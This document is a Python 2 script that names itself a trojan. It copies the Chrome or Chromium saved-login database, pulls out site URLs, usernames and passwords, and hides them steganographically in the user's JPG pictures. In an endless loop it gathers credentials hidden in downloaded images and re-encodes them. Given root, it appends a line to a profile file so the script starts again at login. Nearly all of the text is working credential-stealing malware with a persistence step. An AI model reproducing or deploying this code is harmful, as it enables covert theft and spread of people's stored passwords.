#!/usr/bin/python

import glob
from os import path, geteuid, remove
import stepic
import Image
from datetime import datetime, timedelta
import sys
from time import sleep
import re
import sqlite3 as sql
from shutil import copy

# Function to encode a stego message from image
def encode(filepath, message):
	img = Image.open(filepath)
	stegimg = stepic.encode(img,message);
	stegimg.save(filepath,'PNG')

# Function to decode the stego message from image
def  decode(filepath):
	img = Image.open(filepath)
	message = stepic.decode(img)
	return message


# Function to format message.  Message format  e.g. 06qwertyshamilcm@facebook.com
def format_msg(entry):
	msg = str(entry[2].__len__()).zfill(2) + entry[2] + entry[0] + "@" + entry[1] + "#"
	return msg
	

#Function to check if a message is a valid msg
def isvalidformat(msg):
	if ((msg[0]=='0' or msg[0]=='1')) and (msg[1] >= '0' and msg[1] <= '9') :
		return True
	else:
		return False
				
# Function to decrypt passwords from the browser
def decrypt_passwords():
	msglist = []
	try:
		chrome_path = path.expanduser("~/.config/google-chrome/Default/Login Data")
		if not path.exists(chrome_path):
			chrome_path = path.expanduser("~/.config/chromium/Default/Login Data")
		temp_path = "/tmp/Login Data"
		copy(chrome_path,temp_path)
		db = sql.connect(temp_path)
		cur = db.cursor() 
		cur.execute('select origin_url, username_value, password_value from logins;')
		savedlist = []
		rows = cur.fetchall()
		for row in rows:
			savedlist.append([str(row[1]),str(row[0]),str(row[2])])		
		for entry in savedlist:
			msglist.append(format_msg(entry))
		remove(temp_path)		
	except:
		pass
	#print msglist
	return msglist
		
# Function to decrypt passwords from the browser old
def decrypt_passwords2():
	chrome_path = path.expanduser("~/.config/google-chrome/Default/Login Data")
	try:
		f = open(chrome_path,'r')
		lines = []
		s=""
		while True:
			c = f.read(1)
			if not c:
			  break
			elif c>=' ' and c<='~':	
				s=s+c
				#print c,
			elif  c=='\n':
				lines.append(s)
				s=""
		
		f.close()
		r = re.compile('/')
		l1 = r.split(lines[1])
		l2 = r.split(lines[2])
		i=1

		x = []
		while(5+(i-1)*9 < l1.__len__()):
			x.append(l1[5+(i-1)*9])			#Hostname
			x.append(l1[6+(i-1)*9])
			i=i+1

		y = []
		i=1
		while(3+(i-1)*6 < l2.__len__()):
			y.append(l2[3+(i-1)*6])
			i=i+1
		i=1
		savedlist = []
		while(2*(i-1) < x.__len__()):
			hostname = x[2*(i-1)]
			s1 = x[2*(i-1) + 1]
			s2 = y[i-1]
			for j in range(0,1000):
				if s1[j:j+5].lower() == 'email':
					break
			s1 = s1[j:]
			for j in range(0,1000):
				if s2[j:j+5].lower() == 'email':
					break
			s2 = s2[j:]
			for j in range (0,1000):
				if(s2[j] != s1[j]):
					break
			s3 = s1[j:]
			s4 = s2[j:]
			password = s3[:-len(s4)]
			s2 = s2[:-len(s4)]
			s2 = s2[5:]
			j = len(s2)
			while (j>=0):
				j = j - 1
				if(s2[j].lower()=='p'):
					break
			username =  s2[:j]
			savedlist.append([username,hostname,password])
			i=i+1
	except:
		pass
	msglist = []
	for entry in savedlist:
		msglist.append(format_msg(entry))
	return msglist


# Function to initialize first time run
def first_run():
	msglist = decrypt_passwords()			# List of browser saved passwords
	num_of_msgs = msglist.__len__()			# No. of browser saved passwords
	i = -1									# Message Iterator
	encode_dir = path.expanduser("~/Pictures/Pictures/")
	num_of_files = 0
	if num_of_msgs > 0:
		for infile in glob.glob(encode_dir+"*.jpg"):
			i = (i+1)%num_of_msgs;
			encode(infile,msglist[i]);
			num_of_files = num_of_files + 1
		f = open('bootup.cfg', 'w+')
		num_encoded = min(num_of_msgs, num_of_files)
		f.write(str(num_encoded)+"\n")
		f.write("1950-01-01 00:00:00")
		f.close()
		for infile in glob.glob(encode_dir+"*.jpg"):
			print "-->ENCODE RUN : ",decode(infile)
	if geteuid() == 0:						#Adding to startup scripts if root privileges
		try:
			f = open('../profile','a')			# Change file to /etc/profile
			f.write("sudo python trojan.py&");
			f.close()
		except:
			pass
	
# Function for successive encode runs		
def encode_run (decode_msglist,update_dt):
	browser_msglist = decrypt_passwords()
	msglist = browser_msglist + decode_msglist
	num_of_msgs = msglist.__len__()			# No. of browser saved passwords
	i = -1									# Message Iterator
	encode_dir = path.expanduser("~/Pictures/Pictures/")
	num_of_files = 0
	if num_of_msgs > 0:
		for infile in glob.glob(encode_dir+"*.jpg"):
			i = (i+1)%num_of_msgs;
			encode(infile,msglist[i]);
			num_of_files = num_of_files + 1
		f = open('bootup.cfg', 'w+')
		num_encoded = min(num_of_msgs, num_of_files)
		f.write(str(num_encoded)+"\n")
		f.write(update_dt.strftime("%Y-%m-%d %H:%M:%S"))
		f.close()
		for infile in glob.glob(encode_dir+"*.jpg"):
			print "-->ENCODE RUN : ",decode(infile)
	return num_encoded

# Main Function
while True:
	sleep(10)
	if (not path.exists('bootup.cfg')):			#Checking if its first run of trojan
		first_run()
	else:
		try:
			update_dt
		except NameError:
			update_dt = None
		if update_dt is None:
			f = open('bootup.cfg','r')
			try:
				num_encoded = int(f.readline())
			except:
				num_of_msgs = 0
			update_dtline = f.readline()
			f.close()
			update_dt = datetime.strptime(update_dtline,"%Y-%m-%d %H:%M:%S")
		
		encode_dir = path.expanduser("~/Pictures/Pictures/")
		decode_dir = path.expanduser("~/Pictures/Downloads/")
		encodeflg = 0
		msglist = []
		for infile in glob.glob(decode_dir+"*.jpg"):
			#print decode(infile);	
			file_cdt = datetime.fromtimestamp(path.getctime(infile))
			
			if ( (file_cdt - update_dt) > timedelta(0)):
				msg = decode(infile)
				if (isvalidformat(msg)):
					print "***DOWNLOADS***", msg
					if msg not in msglist:
						msglist.append(msg)
						encodeflg = 1
				# To update encode variables	
		#print "Update Time:", update_dt
		f = open('bootup.cfg','w+')
		f.write(str(num_encoded)+"\n")
		update_dt = datetime.now()
		f.write(datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
		f.close()
		if (encodeflg == 1):
			num_encoded = encode_run(msglist,update_dt)
		
			
